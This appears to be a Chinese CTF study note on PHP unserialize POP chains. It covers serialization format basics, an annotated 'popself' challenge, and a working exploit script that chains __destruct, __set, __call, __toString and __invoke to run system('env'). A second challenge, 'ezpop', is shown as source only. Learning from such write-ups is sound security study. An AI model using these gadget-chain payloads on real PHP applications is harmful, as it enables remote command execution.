```php
<?php
class test{
    public $pub='benben';
    private $ben='dazhuang';
    function jineng(){
        echo $this->pub;
    }
}
$a=new test;
$b=serialize($a);
echo urlencode($b);
?>
```
本地运行后得到`O:4:"test":1:{s:3:"pub";s:6:"benben";}`其中O代表object,4是类名长度，即test长度，1表示成员属性的数量,s代表字符串,3表示变量名长度，即pub长度，pub变量名字，6是值的长度，即benben的长度，
private 私有属性序列化时，在变量名前加`%00类名%00`,所以在做反序列化题目时，最后要加一句，`echo urldecode($b);`先把%00解码为空，再用urlencode加密，再提交， protected受保护属性序列化时，在变量名前加`%00*%00`,

记一道做过的比较难的题目,从这道题学到很多东西
## popself
```php
<?php  
show_source(__FILE__);  
  
error_reporting(0);  
class All_in_one  
{  
    public $KiraKiraAyu;  
    public $_4ak5ra;  
    public $K4per;  
    public $Samsāra;  
    public $komiko;  
    public $Fox;  
    public $Eureka;  
    public $QYQS;  
    public $sleep3r;  
    public $ivory;  
    public $L;  
  
    public function __set($name, $value){  
        echo "他还是没有忘记那个".$value."<br>";  
        echo "收集夏日的碎片吧<br>";        
        $fox = $this->Fox; //又要触发__set,在给不存在的成员属性或不可访问的成员属性赋值时触发
  //$fox不能是All_in_one的实例对象(但可以是数组，字符串，其他类的对象)，$fox()是用来调用$fox这个可调用体并获取其返回值，php规定[类名,静态方法名]这种格式的数组是可调用类型，因为summer类里有一个函数find_myself()可以return "summer",所以$fox=['summer','find_myself']可以
        if ( !($fox instanceof All_in_one) && $fox()==="summer"){  
            echo "QYQS enjoy summer<br>";  
            echo "开启循环吧<br>";            
            $komiko = $this->komiko;            
            $komiko->Eureka($this->L, $this->sleep3r); //4.调用了一个不存在的方法时触发__call,Eureka不是方法,需要L='2e5' ,前提是满足if条件
        }  
    }  
  
    public function __invoke(){  
        echo "恭喜成功signin!<br>";  
        echo "welcome to Geek_Challenge2025!<br>";        
        $f = $this->Samsāra;        
        $arg = $this->ivory;        
        $f($arg); //1.这里可以执行指令，如果$f='system' $arg='env',那么就可以得到flag ,这就需要$Samsāra='system' $ivory='env',但是要触发__invoke，对象被当做函数时调用。
    }  
    public function __destruct(){  
  
        echo "你能让K4per和KiraKiraAyu组成一队吗<br>";  
  
        if (is_string($this->KiraKiraAyu) && is_string($this->K4per)) {  
            if (md5(md5($this->KiraKiraAyu))===md5($this->K4per)){  //强比较，还必须是字符串，没法绕过
                die("boys和而不同<br>");  
            }  
  
            if(md5(md5($this->KiraKiraAyu))==md5($this->K4per)){ 
                echo "BOY♂ sign GEEK<br>";  
                echo "开启循环吧<br>";                
                $this->QYQS->partner = "summer";  //5.partner是不存在的成员属性，赋值触发__set ,但是又要满足if条件，需要K4per='QNKCDZO' KiraKiraAyu='179122048' ，但是这些内容又都是要触发__destruct方法
            }  
            else {  
                echo "BOY♂ can`t sign GEEK<br>";  
                echo md5(md5($this->KiraKiraAyu))."<br>";  
                echo md5($this->K4per)."<br>";  
            }  
        }  
        else{  
            die("boys堂堂正正");  
        }  
    }  
  
    public function __tostring(){  
        echo "再走一步...<br>";        
        $a = $this->_4ak5ra;        
        $a();  //2.这里把对象当作函数调用了，可以触发__invoke,但要触发__tostring,对象被当作字符串时自动调用
    }  
  
    public function __call($method, $args){  //__call的这两个参数$method是不存在的方法，即Eureka($this->L, $this->sleep3r),$args是一个数组 ，数组内容就是函数参数，即[$this->L, $this->sleep3r]       
        if (strlen($args[0])<4 && ($args[0]+1)>10000){  
            echo "再走一步<br>";  
            echo $args[1];  。//3。对象被当成字符串调用了，触发__tostring,但要触发__call，但前提是满足if条件，需要$args[0]=2e5
        }  
        else{  
            echo "你要努力进窄门<br>";  
        }  
    }  
}  
  
class summer {  
    public static function find_myself(){  
        return "summer";  
    }  
}  
$payload = $_GET["24_SYC.zip"];  
  
if (isset($payload)) {    
	unserialize($payload); //6.开始
} else {  
    echo "没有大家的压缩包的话，瓦达西！<br>";  
}  
  
?>
```
exp
```php
<?php
class All_in_one

{
    public $KiraKiraAyu;
    public $_4ak5ra;
    public $K4per;
    public $Samsāra;
    public $komiko;
    public $Fox;
    public $Eureka;
    public $QYQS;
    public $sleep3r;
    public $ivory;
    public $L;
    }
$a = new All_in_one();
$a->KiraKiraAyu = "179122048";
$a->K4per= "QNKCDZO";
$a->QYQS = new All_in_one();
$a->QYQS->Fox = ['summer','find_myself'];
$a->QYQS->L = '2e5';
$a->QYQS->komiko = new All_in_one();    
$a->QYQS->sleep3r = new All_in_one();  
$a->QYQS->sleep3r->_4ak5ra = new All_in_one();
$a->QYQS->sleep3r->_4ak5ra->ivory = 'env';
$a->QYQS->sleep3r->_4ak5ra->Samsāra = 'system';
echo urlencode(serialize($a));
```
再逐行解释一下，
- `$a = new All_in_one();` 创建根对象，同时触发`__destruct`
- `$a->KiraKiraAyu = "179122048";` 和`$a->K4per= "QNKCDZO";` 用来绕过`if(md5(md5($this->KiraKiraAyu))==md5($this->K4per))` 
- `$a->QYQS = new All_in_one();` 把QYQS实例化为对象是因为`$this->QYQS->partner = "summer";`QYQS调用了其他成员属性，只有实例化为对象后才可以调用其他成员属性。
- `$a->QYQS->Fox = ['summer','find_myself'];` 是为了绕过`if ( !($fox instanceof All_in_one) && $fox()==="summer")` ,(题目注释里有原因)，
- `$a->QYQS->L = '2e5';` 是为了绕过`if (strlen($args[0])<4 && ($args[0]+1)>10000)` 
- `$a->QYQS->komiko = new All_in_one();`这是为了让局部变量`$komiko = $this->komiko = $a->QYQS->komiko = 构造的All_in_one实例对象` 这样就相当于把局部变量`$komiko`等价于对象了，只有对象才可以执行接下来的操作`$komiko->Eureka($this->L, $this->sleep3r);`
- `$a->QYQS->sleep3r = new All_in_one();` 之所以要把sleep3r实例化，是因为下一步`echo $args[1];`是把对象当字符串调用触发`__toString`,而这里的`$args`就是sleep3r,必须实例化对象。
- `$a->QYQS->sleep3r->_4ak5ra = new All_in_one();` 是因为`$a = $this->_4ak5ra; $a();`把对象当函数调用，触发`__invoke`所以得先把`_4ak5ra`实例化为对象。
- `$a->QYQS->sleep3r->_4ak5ra->ivory = 'env';`  `$a->QYQS->sleep3r->_4ak5ra->Samsāra = 'system';` 最后一步了，不需要触发任何魔术方法，直接赋值就可以了。
- `echo urlencode(serialize($a));` 不管题目是否有私有属性，必须url编码，养成习惯。
## ezpop
```php
<?php  
Class SYC{  
    public $starven;  
    public function __call($name, $arguments){  
	        if(preg_match('/%|iconv|UCS|UTF|rot|quoted|base|zlib|zip|read/i',$this->starven)){  
            die('no hack');  
        }        
        file_put_contents($this->starven,"<?php exit();".$this->starven);  
    }  
}  
  
Class lover{  
    public $J1rry;  
    public $meimeng;  
    public function __destruct(){  
        if(isset($this->J1rry)&&file_get_contents($this->J1rry)=='Welcome GeekChallenge 2024'){  
            echo "success";            
            $this->meimeng->source;  
        }  
    }  
  
    public function __invoke()  
    {  
        echo $this->meimeng;  
    }  
  
}  
  
Class Geek{  
    public $GSBP;  
    public function __get($name){        
	    $Challenge = $this->GSBP;  
        return $Challenge();  
    }  
  
    public function __toString(){        
    $this->GSBP->Getflag();  
        return "Just do it";  
    }  
  
}  
  
if($_GET['data']){  
    if(preg_match("/meimeng/i",$_GET['data'])){  
        die("no hack");  
    }   
    unserialize($_GET['data']);  
}else{   
	highlight_file(__FILE__);  
}
```